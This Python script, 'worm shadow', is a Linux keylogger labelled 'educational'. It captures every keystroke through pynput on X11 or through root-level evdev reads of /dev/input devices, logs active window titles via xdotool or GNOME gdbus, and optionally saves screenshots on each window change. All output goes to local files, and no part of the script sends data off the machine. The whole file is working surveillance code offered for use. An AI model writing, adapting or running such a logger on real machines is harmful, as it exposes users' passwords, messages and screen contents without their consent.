#!/usr/bin/env python3
# worm shadow — linux all-in-one logger (educational)
import os
import sys
import time
import threading
import subprocess
import datetime
import re
import shutil
from pathlib import Path

# ---------- dep check ----------
missing = []
try:
    import mss
    import mss.tools
except ImportError:
    missing.append("mss")
try:
    from pynput import keyboard as pynput_kb
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
try:
    import evdev
    from evdev import ecodes
    HAS_EVDEV = True
except ImportError:
    HAS_EVDEV = False

if missing:
    print(f"[worm shadow] missing deps: {', '.join(missing)}")
    print("[worm shadow] run: python3 setup1.py")
    sys.exit(1)

# ---------- config ----------
LOG_DIR = Path("logs")
SHOT_DIR = Path("screenshots")
KEY_LOG = LOG_DIR / "keylog.txt"
WIN_LOG = LOG_DIR / "windowlog.txt"
SCREENSHOT_ENABLED = False
IS_ROOT = (os.geteuid() == 0)
SESSION = os.environ.get("XDG_SESSION_TYPE", "").lower()
IS_WAYLAND = SESSION == "wayland"

# ---------- helpers ----------
def ensure_dirs():
    LOG_DIR.mkdir(exist_ok=True)
    SHOT_DIR.mkdir(exist_ok=True)


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def safe_filename(s):
    s = re.sub(r'[^\w\s-]', '', s).strip()
    s = re.sub(r'[-\s]+', '_', s)
    return s[:80] or "unknown"


def append(path, line):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

# ---------- window title (x11 via xdotool; wayland fallbacks) ----------
def get_active_window_title():
    # try xdotool first (works on x11, and on xwayland apps under wayland)
    if shutil.which("xdotool"):
        try:
            out = subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"],
                stderr=subprocess.DEVNULL, timeout=1
            )
            t = out.decode(errors="ignore").strip()
            if t:
                return t
        except Exception:
            pass
    # gnome wayland fallback: try gdbus to shell
    if IS_WAYLAND and shutil.which("gdbus"):
        try:
            out = subprocess.check_output(
                ["gdbus", "call", "--session",
                 "--dest", "org.gnome.Shell",
                 "--object-path", "/org/gnome/Shell",
                 "--method", "org.gnome.Shell.Eval",
                 "global.get_window_actors().map(a=>a.meta_window.get_title()).join('|')"],
                stderr=subprocess.DEVNULL, timeout=1
            )
            # parse the returned string — best effort
            s = out.decode(errors="ignore")
            m = re.search(r"'([^']*)'", s)
            if m and m.group(1):
                return m.group(1).split("|")[-1]
        except Exception:
            pass
    return None

# ---------- key capture: backend 1 — pynput (x11 only) ----------
def run_pynput_backend():
    print("[worm shadow] key backend: pynput (x11)")
    def on_press(key):
        try:
            if hasattr(key, "char") and key.char is not None:
                append(KEY_LOG, f"{ts()} | {key.char}")
            else:
                append(KEY_LOG, f"{ts()} | [{key}]")
        except Exception:
            pass
    listener = pynput_kb.Listener(on_press=on_press)
    listener.start()
    return listener

# ---------- key capture: backend 2 — /dev/input (wayland-safe, needs root) ----------
KEY_NAMES = {}
if HAS_EVDEV:
    # build reverse map of key codes to names
    for name in dir(ecodes):
        if name.startswith("KEY_"):
            code = getattr(ecodes, name)
            if isinstance(code, int):
                KEY_NAMES[code] = name[4:].lower() if name[4:].isupper() else name[4:]

def run_evdev_backend():
    if not HAS_EVDEV:
        print("[worm shadow] evdev not installed — cannot use /dev/input backend")
        return []
    if not IS_ROOT:
        print("[worm shadow] /dev/input backend needs root. run with sudo.")
        return []

    import glob
    devices = []
    for path in glob.glob("/dev/input/event*"):
        try:
            d = evdev.InputDevice(path)
            caps = d.capabilities()
            if ecodes.EV_KEY in caps:
                devices.append(d)
        except Exception:
            continue

    if not devices:
        print("[worm shadow] no readable input devices found.")
        return []

    print(f"[worm shadow] key backend: evdev on {len(devices)} device(s)")

    def read_device(dev):
        try:
            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY:
                    # value: 1 = press, 0 = release, 2 = autorepeat
                    if event.value != 1:
                        continue
                    name = KEY_NAMES.get(event.code, f"key_{event.code}")
                    append(KEY_LOG, f"{ts()} | [{name}]")
        except Exception:
            pass

    threads = []
    for d in devices:
        t = threading.Thread(target=read_device, args=(d,), daemon=True)
        t.start()
        threads.append(t)
    return threads

# ---------- window monitor ----------
def window_monitor(stop_event):
    last = None
    while not stop_event.is_set():
        title = get_active_window_title()
        if title and title != last:
            last = title
            append(WIN_LOG, f"{ts()} | {title}")
            if SCREENSHOT_ENABLED:
                take_screenshot(title)
        time.sleep(1)

# ---------- screenshots ----------
def take_screenshot(title):
    if not SCREENSHOT_ENABLED:
        return
    try:
        with mss.mss() as sct:
            mon = sct.monitors[1]
            img = sct.grab(mon)
            stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"{stamp}_{safe_filename(title)}.png"
            mss.tools.to_png(img.rgb, img.size, output=str(SHOT_DIR / fname))
    except Exception:
        pass

# ---------- main ----------
def main():
    global SCREENSHOT_ENABLED
    ensure_dirs()

    print("[worm shadow] linux all-in-one logger (kali)")
    print(f"  session:     {SESSION or 'unknown'}")
    print(f"  root:        {IS_ROOT}")
    print(f"  logs:        {LOG_DIR.resolve()}")
    print(f"  screenshots: {SHOT_DIR.resolve()}")

    # pick key backend
    listener = None
    ev_threads = []

    if IS_WAYLAND:
        if IS_ROOT and HAS_EVDEV:
            ev_threads = run_evdev_backend()
            if not ev_threads:
                print("[worm shadow] no evdev backend running — exiting.")
                sys.exit(1)
        elif HAS_PYNPUT:
            print("[worm shadow] wayland + non-root: pynput will receive nothing.")
            print("[worm shadow] continuing anyway so you can see it's blocked.")
            listener = run_pynput_backend()
        else:
            print("[worm shadow] no usable key backend on wayland. exiting.")
            sys.exit(1)
    else:
        # x11
        if HAS_PYNPUT:
            listener = run_pynput_backend()
        elif IS_ROOT and HAS_EVDEV:
            ev_threads = run_evdev_backend()
        else:
            print("[worm shadow] no usable key backend. exiting.")
            sys.exit(1)

    choice = input("Enable screenshots? (y/N): ").strip().lower()
    if choice != "y":
        print("[worm shadow] no screenshots. closing.")
        if listener:
            listener.stop()
        sys.exit(0)

    SCREENSHOT_ENABLED = True
    print("[worm shadow] screenshots on. logging. ctrl+c to stop.")

    stop_event = threading.Event()
    wm_thread = threading.Thread(target=window_monitor, args=(stop_event,), daemon=True)
    wm_thread.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[worm shadow] stopping...")
        stop_event.set()
        if listener:
            listener.stop()
        print("[worm shadow] stopped. later, he.")


if __name__ == "__main__":
    main()
